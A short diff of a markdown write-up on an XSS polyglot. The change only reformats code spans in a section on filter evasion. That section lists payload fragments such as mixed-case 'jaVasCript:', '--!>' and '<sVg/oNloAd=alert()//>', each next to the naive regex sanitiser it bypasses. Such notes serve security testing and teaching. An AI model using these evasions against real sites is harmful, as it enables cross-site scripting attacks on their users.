@@ -236,15 +236,15 @@ _Demo: <https://jsbin.com/ruhofi>_
 ## Filter evasion:
 As you might have already noticed, the polyglot has been crafted with filter evasion in mind. For instance:
 
-`jaVasCript:`, `oNcliCk`, et al: Bypasses ```php preg_replace('/\b(?:javascript:|on\w+=)/', '', payload) ```.
+`jaVasCript:`, `oNcliCk`, et al: Bypasses ```preg_replace('/\b(?:javascript:|on\w+=)/', '', payload)```.
 
-`--!>`: Bypasses ```php preg_replace('/-->/', '', payload)```.
+`--!>`: Bypasses ```preg_replace('/-->/', '', payload)```.
 
-``` /*`/*\` ```: Bypasses ```php preg_replace('/`/', '\`', payload) ```.
+``` /*`/*\` ```: Bypasses ```preg_replace('/`/', '\`', payload)```.
 
-``` </stYle/</titLe/</teXtarEa/</scRipt/--!> ```: Bypasses ```php preg_replace('<\/\w+>', '', payload) ```.
+``` </stYle/</titLe/</teXtarEa/</scRipt/--!> ```: Bypasses ```preg_replace('<\/\w+>', '', payload)```.
 
-``` <sVg/oNloAd=alert()//> ```: Bypasses ```php preg_replace('<\w+\s+', '', payload) ```.
+``` <sVg/oNloAd=alert()//> ```: Bypasses ```preg_replace('<\w+\s+', '', payload)```.
 
 ## Bonus attacking contexts covered:
 #### CRLF-based cross site scripting:
